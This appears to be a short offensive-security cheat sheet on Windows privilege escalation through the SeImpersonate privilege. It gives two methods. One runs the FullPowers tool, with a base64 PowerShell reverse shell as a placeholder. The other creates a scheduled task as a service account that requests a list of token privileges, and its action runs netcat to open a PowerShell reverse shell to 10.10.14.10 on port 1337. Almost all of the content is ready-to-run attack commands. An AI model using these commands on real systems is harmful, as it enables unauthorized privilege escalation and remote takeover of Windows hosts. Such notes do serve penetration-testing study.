---
title: "SeImpresonate"
date: 2024-8-2
tags: ["SeImpresonate", "Windows", "potato", "privesc", "fullpower"]
---

---
### Abuse #1: Recover SeImpresonate

[FullPower](https://github.com/itm4n/FullPowers/releases/tag/v0.1)

```powershell
.\FullPowers.exe -c "whoami /priv"
```

```powershell
# Revshell
.\FullPowers.exe -c "<powershell #3 Base64>"
```

### Abuse #2: Recover tokens via schedule task

```powershell
# Create a list of privileges 
[System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeTimeZonePrivilege"
```

```powershell
# Create a Principal for the task 
$TaskPrincipal = New-ScheduledTaskPrincipal -UserId "<SERVICE_ACCOUNT>" -LogonType ServiceAccount -RequiredPrivilege $Privs
```

```powershell
# Create an action for the task 
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `C:\\Windows\\Tasks\\nc.exe -e powershell 10.10.14.10 1337`""
```

```powershell
# Create the task
Register-ScheduledTask -Action $TaskAction -TaskName "SomeTask" -Principal $TaskPrincipal
```

```powershell
# Start the task
Start-ScheduledTask -TaskName "SomeTask"
```
 
<br>